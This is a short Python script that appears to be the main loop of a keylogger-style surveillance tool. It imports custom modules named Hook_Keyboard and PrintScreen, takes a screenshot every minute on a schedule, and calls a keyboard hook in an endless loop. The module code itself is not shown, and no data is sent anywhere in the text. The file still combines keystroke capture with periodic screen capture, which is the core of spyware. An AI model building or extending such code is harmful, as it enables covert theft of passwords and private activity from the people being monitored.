import Hook_Keyboard
import PrintScreen
import schedule
import time


schedule.every(1).minutes.do(PrintScreen.take_screen)
while True:
    Hook_Keyboard.hook_keyboard()
    schedule.run_pending()



